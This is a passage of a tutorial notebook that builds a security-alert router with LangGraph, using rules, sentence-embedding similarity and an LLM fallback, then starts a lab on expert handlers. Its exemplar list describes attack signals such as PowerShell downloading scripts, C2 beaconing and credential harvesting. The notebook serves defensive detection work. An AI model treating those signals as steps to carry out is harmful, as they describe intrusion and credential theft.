        "- If the similarity is above a **threshold**, we route to that category. If not, we still abstain. If threshold too low -> false positives, too high -> too many abstains.\n",
        "- This way, rules handle the obvious cases, and embeddings 'rescue' the fuzzy ones - expanding coverage without going full LLM *yet*.\n"
      ],
      "metadata": {
        "id": "pZE13dVs-3Vf"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Flow\n",
        "\n",
        "\n",
        "```sql\n",
        "\n",
        "   (Entry)\n",
        "     │\n",
        "     ▼\n",
        " [ rules_node ]\n",
        "     │\n",
        "     ├── if route ≠ \"abstain\" ──> END\n",
        "     │\n",
        "     └── if route == \"abstain\"\n",
        "                │\n",
        "                ▼\n",
        "         [ embed_node ] ──decision──> END\n",
        "\n",
        "```"
      ],
      "metadata": {
        "id": "BCFotUosLwRZ"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Create Examplars\n",
        "Short rules for categories - we need those to compare our alert with embeddings of those"
      ],
      "metadata": {
        "id": "qm6kpVAfFZiI"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "EXEMPLARS = {\n",
        " \"phishing\": [\n",
        "   \"email asks to reset password via external domain; dkim or dmarc failed; requests mfa backup codes\",\n",
        "   \"login page clone credential harvest with lookalike domain\"\n",
        " ],\n",
        " \"malware\": [\n",
        "   \"edr detects powershell downloads script from external ip; c2 beacons with jitter\",\n",
        "   \"suspicious executable hash and persistence with callbacks\"\n",
        " ],\n",
        " \"misconfig\": [\n",
        "   \"s3 bucket public-read exposure cis noncompliance\",\n",
        "   \"security group allows 0.0.0.0/0 on ssh\"\n",
        " ]\n",
        "}"
      ],
      "metadata": {
        "id": "4Rdz8MwoFLCT"
      },
      "execution_count": 13,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Get emb model and convet text to embs"
      ],
      "metadata": {
        "id": "QTpqCG2KFXNi"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "embed_model = SentenceTransformer(\"sentence-transformers/all-MiniLM-L6-v2\")  # model to convert text to embedding\n",
        "\n",
        "EX_VECS = {k: embed_model.encode(v) for k,v in EXEMPLARS.items()} # getting embs\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 369,
          "referenced_widgets": [
            "92b662a8f22a42f08a42070c59d6be81",
            "16a0e03dd5f248fc8a9470f8c30f64fd",
            "20a4036254f04354adcfe8749a2bd830",
            "cbc2d46dc72f4e24ba1a45f1d297715f",
            "8576283e5ea14e7fa32da295af643d85",
            "4dd894dc12bc4cdbbc44fd2d3890172b",
            "d1c9b2ef55d44e78b36b65cf1fe12b98",
            "7125010422b24325bb82a551b346806f",
            "5ca7fb7f11a948bd898f311906e0bcf2",
            "4cff4f0ecf354d95bba4a1a253d3aadf",
            "2da80a2f34864edeb0cae4064c42b287",
            "d89e19ba439845ac9a3dd5b952013976",
            "266ed5ece8cf48599672aeb36304b0d5",
            "bfc42ffd563d4fd2b5f6d39b0c3e0b81",
            "eaedbdee2d3c47999d6f2879df8cf512",
            "e11a8980bde44f12b2dbd4f91e7d4d40",
            "2f77145e3a174343a3d5666fca10b5ca",
            "301422bebbcd4ca3a36fc96320c5a6fc",
            "e0f7d8078fbd45b6b95ad8d813561870",
            "0a7c00c2493a47cf9ec6233f0b6698a4",
            "5e2254e9bf6942b0b7fabe9e3e726e46",
            "a87b51f25e3d4a55bcdc858b32233cc1",
            "4040f7a607d44df3bc501e02363b51fa",
            "645234e2e7ed486b89060f8a1f256e39",
            "c4361cfd58e64cf7a49898fe5485cb20",
            "dadc98267b2a45f4990a7529c83b1a94",
            "5d5f1bda9af74528997a123ccc3090e1",
            "2507dcbf9cd14612b5050c58d9f4ee24",
            "b6c4048a534d43d0a28d21c99745c23c",
            "be217058a76a479689bd01fc0365327a",
            "7e3209ee00594c4d9723b50473a849b2",
            "753b720eb66d4151bebdb47828b7637d",
            "22e4d021b6e34d96b2c6dd6767d0d2d6",
            "3aa2f496463048479a91abac263b6930",
            "432023cb05b94c738612b0e1fff3ecab",
            "3cb0883328f34a22bd17e36da42486eb",
            "b4e3196dc5454192999fe630fa113c11",
            "079b4204904f421c9e7e172c40f4c78b",
            "ddcb5d8a46c84f6e97e05ee0062e9353",
            "cc71dceaa56742cbb65ada68a595867b",
            "34a212d871ff45d4b0cc7c2de93e2a1a",
            "7f611ba3c398460aa675f3977e09531b",
            "4b923a9f47cb4cd6863404bb7fd1fa91",
            "f8ae5d0862234062a1d7ec502708a28c",
            "c987140944c04cc29eb6f3793eec46db",
            "2d08627dfca1496492395ac4d7546e16",
            "9e9e1052feb1438d8356083f19c424b5",
            "c39af7abf1c949379949214a72214bbf",
            "3007c50c53804e47bcd5c52c6528e8b2",
            "6fb0edc8819344cfa40163b6bbcaa94d",
            "60bf6901ace14047b3b19d7882952598",
            "f6ff06adaeda4db29df569e1176298bf",
            "3beb54e80653477ebdc0b6641ad28c34",
            "98d181213cb24e9aa676f8197d4b41e0",
            "312a1c95f0af41b2896f6c7a5c495781",
            "b01b67e4cc634f2d9d642143081bb5d7",
            "db87f279a25e4cb3b6983fa0bd227fb2",
            "51e44ca58b0348b4899d9a515356d9ca",
            "1c38d90f73b34f5593bfa77f0e036852",
            "c121423f635f4404a1ef6f2a265e7b24",
            "0069c03ea934489c8d591d62c7ff982f",
            "2a0c1a75af5e4747bf92fc9f76d5dd1c",
            "9a56ac4e8dc5434eb284de323f6ef757",
            "6d07a832b3cb42d4a85c9908fdcbec02",
            "e2ff16fe72b64dc99ad5a50bf535fb60",
            "975b633326c840a7b854a36cd8d8df2e",
            "56ee0eebda044ee28442c07e91bd558a",
            "e767817682554ab9966fa543413a0a50",
            "7994f80079bd4b5782ce92126516410d",
            "c1757213e17846118a7111b048142b1e",
            "aaa41dd11525497583f5277ed1ca4f83",
            "b0c93a19614149df8113fcd4b3a90adc",
            "a90e98337d244ea5b97fc476b77d3591",
            "9923d3bbfca64a76a571f9f62e2d2345",
            "af09ce709c5c47f6a15cd53eeb6a7de9",
            "15db90b204814950994485569fbdf203",
            "6cd408dd55c2436e9612f7009831c1a7",
            "330aa617352f4e8484d0b4e7f75bc083",
            "6bc311ea8b3c4c6eb5fc7a67747cc714",
            "08cf0efa968044e4be99ff25dbf83c46",
            "c0f28f0a6bc3453699ecea745e37b23b",
            "9d401fc0d0e5486cb684f64a8e0962d7",
            "97fb9001570048949470e638a3662c6c",
            "63969f19b005420abb1c4eb964e98201",
            "4bc21bee3e0d47228e8095e7228011cf",
            "65c9d7f46bd743f7ab1e0e4e31a3ee81",
            "27fed576764d4ad883c8c8a9e5ddf41f",
            "5aad2a74979144219786adbd951027c2",
            "3fa25240bd10478fb0768ec2df95737a",
            "0e7a64c92aae43b883b81f0b5981846c",
            "7c485999330448bb9d13c42196c140c1",
            "d82eaf6b4c7948818a19d6d68e5bbbaa",
            "e5c80a44b22c489e8682bb0ce51c1402",
            "6183b080c53c45bbaf54503cd494953a",
            "93107289abbf4c14a4daf20ee30921ca",
            "61b0a18bb2a043c99c693d709503f5c6",
            "6ef8ae4c8bca47009cfe31fea2f8be80",
            "93482d976b0945fa88c254eccbcb8a03",
            "c28f1f44bee246e9872c391faa14d6e7",
            "bcf5b733e4b04a91bb4fe65b8c96b839",
            "8586f08035bd44cd876514cc07bc6e3c",
            "4d06d42f02d8464aadcc51d6cdd6be13",
            "91d60e2723f44b45acdac236f1abbd83",
            "3cabb288d46b4174baf3db7792e7f76a",
            "418d18fe9f7f49139254444dc37fd628",
            "3105ed28de19452db1ba55f01a93e192",
            "477f3a186e9b4af493d6361518f8d2b8",
            "3394d63b5d3b4373baba337c10efc58e",
            "39f8a1b1b368443c886a071792a45b07",
            "c9bd99d525fe4cc081a553d50311634f",
            "77839aea7ca342fb8ad13557081082b4",
            "a158757c9e9b48eab395812cec93674c",
            "efb08c7684024bb689645cd687e05285",
            "7aafff94bcc24b86b1b59e94334e0c36",
            "d2fea3348c6b44018f1f2492d2cbdcfd",
            "dc4f20d2da37465ab895f96d7332c364",
            "150485ab371941f99d517d63fdc03205",
            "06af1b2f61df42b8a3294a7c460feccd",
            "2318f363013744229044e99a78d6c619",
            "1ca07ace98514c8988777747c36afcda",
            "03d0175b795448e8b65cecde6cb6d240"
          ]
        },
        "id": "Qlzx-5DD-3AR",
        "outputId": "28463960-869e-4f84-811a-33f557d78fc1"
      },
      "execution_count": 14,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "modules.json:   0%|          | 0.00/349 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "92b662a8f22a42f08a42070c59d6be81"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config_sentence_transformers.json:   0%|          | 0.00/116 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "d89e19ba439845ac9a3dd5b952013976"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "README.md: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "4040f7a607d44df3bc501e02363b51fa"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "sentence_bert_config.json:   0%|          | 0.00/53.0 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "3aa2f496463048479a91abac263b6930"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/612 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "c987140944c04cc29eb6f3793eec46db"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "model.safetensors:   0%|          | 0.00/90.9M [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "b01b67e4cc634f2d9d642143081bb5d7"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer_config.json:   0%|          | 0.00/350 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "56ee0eebda044ee28442c07e91bd558a"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "vocab.txt: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "330aa617352f4e8484d0b4e7f75bc083"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "tokenizer.json: 0.00B [00:00, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "3fa25240bd10478fb0768ec2df95737a"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "special_tokens_map.json:   0%|          | 0.00/112 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "bcf5b733e4b04a91bb4fe65b8c96b839"
            }
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "config.json:   0%|          | 0.00/190 [00:00<?, ?B/s]"
            ],
            "application/vnd.jupyter.widget-view+json": {
              "version_major": 2,
              "version_minor": 0,
              "model_id": "77839aea7ca342fb8ad13557081082b4"
            }
          },
          "metadata": {}
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Create emb-based classifier\n",
        "\n",
        "- convert text to embs\n",
        "- compute cos sim between exemplars and given alert for each route and take most similar\n",
        "- track best match and if similarity is above the threshould `tau` - **classify** as a given route (phish, malware, miscofig), if not - **abstain**"
      ],
      "metadata": {
        "id": "ZNIFmNCdF9UP"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def embed_router(text: str, tau=0.55):  # tau is a threshold\n",
        "    q = embed_model.encode([text])\n",
        "    best_route, best_score = None, -1\n",
        "    for route, vecs in EX_VECS.items():\n",
        "        sim = cosine_similarity(q, vecs).max()\n",
        "        if sim > best_score:\n",
        "            best_route, best_score = route, float(sim)\n",
        "    if best_score >= tau:\n",
        "        return {\"route\": best_route, \"confidence\": best_score, \"reason\": f\"embed_nn:{best_score:.2f}\"}\n",
        "    return {\"route\":\"abstain\",\"confidence\":best_score,\"reason\":\"embed_low_conf\"}\n",
        "\n",
        "def embed_node(state: RouteState):\n",
        "    \"\"\"Check if decision already exists and not abstain -> don't redo, ottherwise - call emb router\"\"\"\n",
        "    d = state[\"decision\"]\n",
        "    if d and d[\"route\"] != \"abstain\":\n",
        "        return {\"decision\": d}\n",
        "    return {\"decision\": embed_router(state[\"text\"])}"
      ],
      "metadata": {
        "id": "DfrcEe2QFXhn"
      },
      "execution_count": 15,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### LangGraph recap\n",
        "\n",
        "\n",
        "**Conditional edges**\n",
        "\n",
        "Conditional edges allow to branch: *next step depends on the state*\n",
        "\n",
        "`go_embed` is a function: it looks at the decision from rules.\n",
        "If the route is `abstain`, return `embed`.\n",
        "Otherwise, return `END`.\n",
        "\n",
        "Then `add_conditional_edges` *maps* those possible *return values to nodes* (`embed` or `END`).\n",
        "\n",
        "So now we've added routing logic:\n",
        "- `If rules succeeded → stop`\n",
        "- `If rules abstained → go to embeddings`"
      ],
      "metadata": {
        "id": "wZx8BX1kJuK8"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def go_embed(state):\n",
        "  return \"embed\" if state[\"decision\"][\"route\"]==\"abstain\" else END"
      ],
      "metadata": {
        "id": "CcE3BaTiJ6W0"
      },
      "execution_count": 16,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "g2 = StateGraph(RouteState)\n",
        "g2.add_node(\"rules\", rules_node)\n",
        "g2.add_node(\"embed\", embed_node)\n",
        "g2.set_entry_point(\"rules\")\n",
        "\n",
        "# conditional edge\n",
        "g2.add_conditional_edges(\"rules\", go_embed, {\"embed\":\"embed\", END: END})\n",
        "g2.add_edge(\"embed\", END)\n",
        "app2 = g2.compile()\n",
        "\n",
        "for label, text in TEST_ALERTS:\n",
        "    out = app2.invoke({\"text\": text, \"decision\": None})\n",
        "    print(label, \"->\", out[\"decision\"])"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "NivcgC-0Fqlj",
        "outputId": "37755931-fa5a-4e2b-94dd-0ec0f3872c52"
      },
      "execution_count": 17,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "phishing -> {'route': 'phishing', 'confidence': 0.8, 'reason': 'email_auth_signals'}\n",
            "malware -> {'route': 'malware', 'confidence': 0.8, 'reason': 'edr_iocs'}\n",
            "misconfig -> {'route': 'misconfig', 'confidence': 0.75, 'reason': 'cloud_misconfig'}\n",
            "blocked -> {'route': 'blocked', 'confidence': 0.99, 'reason': 'pii_detected:card'}\n",
            "unknown -> {'route': 'abstain', 'confidence': 0.10133396089076996, 'reason': 'embed_low_conf'}\n"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### **Lab 3 LLM-as-Router**\n",
        "\n",
        "When both rules and embeddings `abstain` - can't decide, we escalate to an LLM-based router. The LLM is asked explicitly to return a JSON decision (route, confidence, rationale).\n",
        "\n",
        "**Skill:** Use LLM classification as a last resort in the routing pipeline.\n",
        "\n",
        "**Goal:**\n",
        "- Add an llm_node that runs only if both rules and embeddings abstain.\n",
        "- Ensure the LLM outputs a structured decision.\n",
        "- Compare outputs to ground truth.\n",
        "\n",
        "#### **Task**\n",
        "\n",
        "- Implement llm_router(text) -> prompts the LLM to classify into `{phishing, malware, misconfig, blocked, abstain}` and returns JSON.\n",
        "\n",
        "- Extend the graph: `rules → (abstain?) → embed → (abstain?) → llm → END.`\n",
        "\n",
        "- Run on the SOC test alerts, check what cases the LLM rescued.\n",
        "\n",
        "#### **Explanation**\n",
        "\n",
        "- Rules = fast & cheap.\n",
        "\n",
        "- Embeddings = medium cost, semantic coverage.\n",
        "\n",
        "- LLM = expensive, but flexible enough to handle novel cases.\n",
        "\n",
        "**The trick**:\n",
        "\n",
        "> Do not use the LLM first - save xompute/tokens.\n",
        "\n",
        "> Use it only when other methods can't decide.\n",
        "\n",
        "> Try to add a confidence threshold: if the LLM is uncertain, still abstain which is safer for SOC however keep in mind that some LLM would randomly output confidence (for binary classification it would be 0.9 when certain and 0.2 when not sure for models like Gemini or Deepseek)\n",
        "\n",
        "#### **Whats and why's**\n",
        "\n",
        "We use **JSON** which ensures outputs are structured, machine-readable.\n",
        "\n",
        "**Confidence** lets us `threshold decisions` -> “better to abstain than hallucinate.”\n",
        "\n",
        "*Last resort* keeps costs predictable and saves LLM for ambiguous cases.\n",
        "\n",
        "This mirrors a real SOC analyst:\n",
        "\n",
        "> Obvious -> handled by playbook (rules).\n",
        "\n",
        "> Similar-to-known → handled by embeddings.\n",
        "\n",
        "> Weird/novel -> escalated to a human (LLM as a \"super flexible classifier\").\n",
        "\n",
        "#### **Flow**\n",
        "```\n",
        "   (Entry)\n",
        "     │\n",
        "     ▼\n",
        " [ rules_node ]\n",
        "     │\n",
        "     ├── if route ≠ \"abstain\" ──> END\n",
        "     │\n",
        "     └── if route == \"abstain\"\n",
        "                │\n",
        "                ▼\n",
        "         [ embed_node ]\n",
        "                │\n",
        "                ├── if route ≠ \"abstain\" ──> END\n",
        "                │\n",
        "                └── if route == \"abstain\"\n",
        "                           │\n",
        "                           ▼\n",
        "                     [ llm_node ] ──decision──> END\n",
        "```\n",
        "\n"
      ],
      "metadata": {
        "id": "nKVFMi-Icnbh"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Create prompt\n",
        "\n",
        "Force strict JSON output via system message and ask the model to claasify in 5 classes returning JSON and use `abstain` if uncertain.\n",
        "\n",
        "Don't forget `{{double curly brackets}}` to avoid onfusing llm"
      ],
      "metadata": {
        "id": "ytS2dJNVl8Ed"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "ROUTER_SYS = \"You are a SOC alert router. Return ONLY valid JSON.\"\n",
        "ROUTER_USER = \"\"\"Classify the alert into one of:\n",
        "[\"phishing\",\"malware\",\"misconfig\",\"blocked\",\"abstain\"].\n",
        "Output JSON: {{\"route\":\"...\", \"confidence\":0.0-1.0, \"rationale\":\"\"}}\n",
        "Be conservative: if unsure, use \"abstain\".\n",
        "Alert:\n",
        "{alert}\"\"\"\n"
      ],
      "metadata": {
        "id": "iObUSclUl7f6"
      },
      "execution_count": 18,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Router\n",
        "\n",
        "We send an alert to model, (make model determenistic via temperature 0.0), parse result JSON for `route, confidence, rationale` or `abstain`, if `invalid`/`low conf` output - `abstain`\n",
        "\n",
        "\n",
        "**Trick**\n",
        "\n",
        "Also take into the account that not every model is able to follow the strict JSON output, this where mistal small would likely fail, we can use a larger model (Nemotron).\n",
        "\n",
        "Thus we introduce retry logic and a fallback to another model, which is a standard trick to make the system reliable at a cost of more complexity and overcomplicating."
      ],
      "metadata": {
        "id": "AIIyX_e4n3Fb"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "\n",
        "def llm_router(text: str, tau=0.55, max_retries=2):\n",
        "    def try_model(model, text, tau, max_retries):\n",
        "        msgs = [\n",
        "            {\"role\": \"system\", \"content\": ROUTER_SYS},\n",
        "            {\"role\": \"user\", \"content\": ROUTER_USER.format(alert=text)}\n",
        "        ]\n",
        "\n",
        "        for attempt in range(max_retries + 1):\n",
        "            raw = call(model, msgs, temperature=0, max_tokens=200)\n",
        "            try:\n",
        "                obj = json.loads(raw)\n",
        "                route = obj.get(\"route\", \"abstain\")\n",
        "                conf = float(obj.get(\"confidence\", 0.3))\n",
        "                rat = obj.get(\"rationale\", \"\")\n",
        "                # sanity checks\n",
        "                if route not in ROUTES:\n",
        "                    route = \"abstain\"\n",
        "                if conf < tau and route != \"blocked\":\n",
        "                    route = \"abstain\"\n",
        "                return {\"route\": route, \"confidence\": conf, \"reason\": rat}\n",
        "            except Exception as e:\n",
        "                # append correction and retry\n",
        "                msgs.append({\n",
        "                    \"role\": \"user\",\n",
        "                    \"content\": f\"You returned invalid JSON: {raw}. \"\n",
        "                               f\"Error: {e}. Return ONLY valid JSON with keys \"\n",
        "                               f\"['route','confidence','rationale'].\"\n",
        "                })\n",
        "\n",
        "        return None  # failed all retries\n",
        "\n",
        "    # First try primary model\n",
        "    result = try_model(MODEL_ROUTER, text, tau, max_retries)\n",
        "    if result is not None:\n",
        "        return result\n",
        "\n",
        "    # If failed, fallback to secondary model\n",
        "    result = try_model(MODEL_ROUTER_2, text, tau, max_retries)\n",
        "    if result is not None:\n",
        "        result[\"reason\"] += \" (from fallback model)\"\n",
        "        return result\n",
        "\n",
        "    # Both failed → abstain\n",
        "    return {\"route\": \"abstain\", \"confidence\": 0.3, \"reason\": \"invalid_json_both_models\"}"
      ],
      "metadata": {
        "id": "DbRZNZiYn3uP"
      },
      "execution_count": 19,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Node wrapper\n",
        "If decision exists and it's not abstain - skip llm else call it thus llm is a last resort."
      ],
      "metadata": {
        "id": "o7_weyP7njEI"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def llm_node(state: RouteState):\n",
        "    d = state[\"decision\"]\n",
        "    if d and d[\"route\"] != \"abstain\":\n",
        "        return {\"decision\": d}\n",
        "    return {\"decision\": llm_router(state[\"text\"])}"
      ],
      "metadata": {
        "id": "LU_hFv-2nhYf"
      },
      "execution_count": 20,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Action check after running rules route, embed route\n",
        "\n",
        "\n",
        "```\n",
        "rules ──if abstain──> embed ──if abstain──> llm ──> END\n",
        "   │                      │\n",
        "   └─if classified────> END └─if classified────> END\n",
        "\n",
        "```\n",
        "\n",
        "If `rules` don't work use `embeddings`, if that fails - `llm`."
      ],
      "metadata": {
        "id": "u7I2dpPEoSHk"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "def next_after_rules(s):\n",
        "  return \"embed\" if s[\"decision\"][\"route\"]==\"abstain\" else END\n",
        "\n",
        "def next_after_embed(s):\n",
        "  return \"llm\" if s[\"decision\"][\"route\"]==\"abstain\" else END"
      ],
      "metadata": {
        "id": "suc8VWYXmKeI"
      },
      "execution_count": 21,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Try it!\n",
        "\n",
        "We expect `unknown` as the last answer"
      ],
      "metadata": {
        "id": "mfeUBJyQscMz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "g3 = StateGraph(RouteState)\n",
        "for name, node in [(\"rules\", rules_node), (\"embed\", embed_node), (\"llm\", llm_node)]:\n",
        "    g3.add_node(name, node)\n",
        "g3.set_entry_point(\"rules\")\n",
        "\n",
        "# after 'rules' node if the func returns \"embed\" call node 'embed' - embed_node if 'end' - end it\n",
        "g3.add_conditional_edges(\"rules\", next_after_rules, {\"embed\":\"embed\", END: END})\n",
        "# after embeds node if the func returns \"llm\" call node 'llm' - llm_node if 'end' - end it\n",
        "g3.add_conditional_edges(\"embed\", next_after_embed, {\"llm\":\"llm\", END: END})\n",
        "g3.add_edge(\"llm\", END)  # no further branching\n",
        "app3 = g3.compile()"
      ],
      "metadata": {
        "id": "Um1j_QMgtMWB"
      },
      "execution_count": 22,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "preds = []\n",
        "for label, text in TEST_ALERTS:\n",
        "    out = app3.invoke({\"text\": text, \"decision\": None})  # only the last resort route is actually an llm\n",
        "    preds.append((label, out[\"decision\"]))\n",
        "preds\n"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "VeQH0QtXl3P6",
        "outputId": "c3585275-594d-474e-8633-282d23ad05d0"
      },
      "execution_count": 23,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "[('phishing',\n",
              "  {'route': 'phishing', 'confidence': 0.8, 'reason': 'email_auth_signals'}),\n",
              " ('malware', {'route': 'malware', 'confidence': 0.8, 'reason': 'edr_iocs'}),\n",
              " ('misconfig',\n",
              "  {'route': 'misconfig', 'confidence': 0.75, 'reason': 'cloud_misconfig'}),\n",
              " ('blocked',\n",
              "  {'route': 'blocked', 'confidence': 0.99, 'reason': 'pii_detected:card'}),\n",
              " ('unknown',\n",
              "  {'route': 'abstain',\n",
              "   'confidence': 0.0,\n",
              "   'reason': 'Insufficient details to classify the lateral movement activity. (from fallback model)'})]"
            ]
          },
          "metadata": {},
          "execution_count": 23
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### **Lab 4: Experts + Unified Envelope output**\n",
        "\n",
        "When the router has chosen a route, we don't just stop at \"phishing\" or \"malware\" — we actually want to hand off to an **expert agent** that produces structured output. To keep the system consistent and downstream-friendly, we enforce a **unified schema** (*envelope*) for all branches.\n",
        "\n",
        "**Skills**\n",
        "- Add specialist agents (per route).\n",
        "- Standardize outputs using Pydantic Envelope.\n",
        "- Make routing results branch-agnostic (same fields, regardless of path).\n",
        "\n",
        "**Goal**\n",
        "\n",
        "- Implement phishing, malware, and misconfig “experts” (simple role + task prompts).\n",
        "- Add a dispatch node that routes to the correct expert, or handles blocked/abstain.\n",
        "- Validate outputs against the Envelope schema."
      ],
      "metadata": {
        "id": "VS77rwR9d2QT"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "\n",
        "#### **Task**\n",
        "- Define an Envelope with Pydantic.\n",
        "\n",
        "- Implement expert handlers for each route.\n",
        "\n",
        "- Add a dispatch_node that calls the right expert based on the decision.\n",
        "- Update the graph to `rules → (abstain?) → embed → (abstain?) → llm → dispatch → END`\n"
      ],
      "metadata": {
        "id": "7LWsIFSAee0q"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Explanation**\n",
        "\n",
        "Up to now, the router only **classified** alerts. But classification alone isn't very useful for SOC work. We need to act! (Well, sort of)\n",
        "\n",
        "\n",
        "In this lab, we add **experts**: each route has its own specialized agent (phishing analyst, malware IR analyst, cloud misconfig analyst).\n",
        "\n",
        "\n",
        "All of them return **results** wrapped in a **unified envelope**.\n",
        "\n",
        "This means downstream systems (dashboards, automation, SOC playbooks, whatever) don't care which path was taken - they always get the same structure:\n",
        "```\n",
        "{\n",
        "  \"route\": \"phishing\",\n",
        "  \"answer\": \"...\",\n",
        "  \"confidence\": 0.8,\n",
        "  \"extras\": {...}\n",
        "}\n",
        "```"
      ],
      "metadata": {
        "id": "tPJKpm37fL2T"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Whats and why's**\n",
        "\n",
        "What we're doing:\n",
        "\n",
        "- We create **handlers** for each expert route.\n",
        "\n",
        "- **Experts are** just prompted **LLMs with role**-specific instructions.\n",
        "\n",
        "- We add a `dispatch_node` to the graph so that after a decision, we **route the alert to the correct handler**.\n",
        "\n",
        "- Even blocked and abstain routes go through dispatch, producing a **valid envelope** with metadata.\n",
        "\n",
        "\n",
        "**Why this matters:**\n",
        "\n",
        "\n",
        "- Without experts, the router just says *\"this is phishing\"* — not very actionable (Still good though).\n",
        "\n",
        "- With **experts**, it **produces a useful brief** (summary + mitigations), which a SOC analyst can directly use.\n",
        "\n",
        "- Using the **same schema** for all outputs means **downstream code is simpler and safer** (no if-else).\n",
        "- This pattern scales: more experts can be added (e.g., ransomware, insider threat) without breaking consumers."
      ],
      "metadata": {
        "id": "_ydwmomYfsS8"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### **Flow**\n",
        "\n",
        "```\n",
        "   (Entry)\n",
        "     │\n",
        "     ▼\n",
        " [ rules_node ]\n",
        "     │\n",
        "     ├── route ≠ abstain ──> [ dispatch_node ] ──> END\n",
        "     │\n",
        "     └── route == abstain\n",
        "                │\n",
        "                ▼\n",
        "         [ embed_node ]\n",
        "                │\n",
        "                ├── route ≠ abstain ──> [ dispatch_node ] ──> END\n",
        "                │\n",
        "                └── route == abstain\n",
        "                           │\n",
        "                           ▼\n",
        "                     [ llm_node ]\n",
        "                           │\n",
        "                           ▼\n",
        "                    [ dispatch_node ] ──> END\n",
        "```"
      ],
      "metadata": {
        "id": "hSsIbSRre_DJ"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Imports"
      ],
      "metadata": {
        "id": "1PW2Odw6ZOfX"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "from pydantic import BaseModel, Field\n",
        "from typing import Optional"
      ],
      "metadata": {
        "id": "7FnKvituZYVr"
      },
      "execution_count": 24,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "#### Define a unified schema\n",
        "\n",
        "For ease of use if reran without g1"
      ],
      "metadata": {
        "id": "oI3gv7Sfaq6I"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class Envelope(BaseModel):\n",
        "    route: str\n",
        "    answer: str\n",
        "    data: dict = Field(default_factory=dict)\n",
        "    citations: list[str] = Field(default_factory=list)\n",
        "    confidence: float = 0.0\n",
        "    extras: dict = Field(default_factory=dict)\n",
        "    error: Optional[str] = None\n",
        "    schema_version: str = \"1.0\""
      ],
      "metadata": {
        "id": "l1tDZn46ax_r"
      },
      "execution_count": 25,
      "outputs": []
    },
    {
